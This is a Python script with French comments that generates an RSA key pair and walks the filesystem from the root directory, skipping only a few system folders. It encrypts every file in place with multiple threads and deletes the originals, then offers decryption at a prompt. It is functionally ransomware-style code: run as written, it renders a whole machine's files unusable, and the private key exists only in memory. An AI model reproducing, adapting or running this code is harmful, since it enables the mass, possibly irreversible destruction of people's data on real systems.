import os
import rsa
import concurrent.futures

#Génère une paire de clef
def generate_key():
    (pubkey, privkey) = rsa.newkeys(2048)
    return pubkey, privkey

#Chiffre le contenu d'un fichier donné en utilisant la clé publique (bloc par bloc)
def chiffrer_fichier(pubkey, fichier):
    max_block_size = 128
    encrypted_data = b''
    with open(fichier, 'rb') as file:
        while True:
            block = file.read(max_block_size)
            if not block:
                break
            encrypted_block = rsa.encrypt(block, pubkey)
            block_size = len(encrypted_block).to_bytes(4, 'big')
            encrypted_data += block_size + encrypted_block
    return encrypted_data

#Déchiffre un fichier chiffré en utilisant la clé privée (bloc par bloc)
def dechiffrer_fichier(privkey, fichier_chiffre, fichier_dechiffre):
    with open(fichier_chiffre, 'rb') as file_enc, open(fichier_dechiffre, 'wb') as file_dec:
        encrypted_data = file_enc.read()
        i = 0
        while i < len(encrypted_data):
            block_size = int.from_bytes(encrypted_data[i:i+4], 'big')
            i += 4
            encrypted_block = encrypted_data[i:i+block_size]
            decrypted_block = rsa.decrypt(encrypted_block, privkey)
            file_dec.write(decrypted_block)
            i += block_size

#Gère la création de fichiers temporaires et le remplacement du fichier original.
def encrypt_file(pubkey, full_path):
    temp_path = full_path + ".temp"
    try:
        encrypted_data = chiffrer_fichier(pubkey, full_path)
        with open(temp_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(full_path)
        os.rename(temp_path, full_path)
        print(f"{full_path}, chiffré")
    except Exception as e:
        print(f"Erreur lors du chiffrement de {full_path}: {e}")

#similaire à encrypt_file, mais pour le déchiffrement.
def decrypt_file(privkey, full_path):
    temp_path = full_path + ".dec"
    try:
        dechiffrer_fichier(privkey, full_path, temp_path)
        os.remove(full_path)
        os.rename(temp_path, full_path)
        print(f"{full_path}, déchiffré")
    except Exception as e:
        print(f"Erreur lors du déchiffrement de {full_path}: {e}")

#Parcourt les fichiers d'un répertoire donné (et de ses sous-répertoires) et les chiffre.
def discover_and_encrypt(racine, pubkey):
    excluding = ["/proc", "/sys", "/dev", "/boot"]
    with concurrent.futures.ThreadPoolExecutor(max_workers) as executor:
        for root, directories, files in os.walk(racine):
            if any(root.startswith(excl) for excl in excluding):
                continue
            for file in files:
                full_path = os.path.join(root, file)
                executor.submit(encrypt_file, pubkey, full_path)

#Fonctionne de la même manière que discover_and_encrypt, mais pour le déchiffrement des fichiers.
def discover_and_decrypt(racine, privkey):
    with concurrent.futures.ThreadPoolExecutor(max_workers) as executor:
        for root, directories, files in os.walk(racine):
            for file in files:
                full_path = os.path.join(root, file)
                executor.submit(decrypt_file, privkey, full_path)

# Exemple d'utilisation
pubkey, privkey = generate_key()
#Nombre de threads à utiliser
max_workers = 8
# Chiffrer les fichiers
racine_chiffrement = "/"
discover_and_encrypt(racine_chiffrement, pubkey)

# Demander si les fichiers doivent être déchiffrés
user_input = input("Voulez-vous déchiffrer les fichiers chiffrés ? (yes/no): ")
if user_input.lower() == "yes":
    discover_and_decrypt(racine_chiffrement, privkey)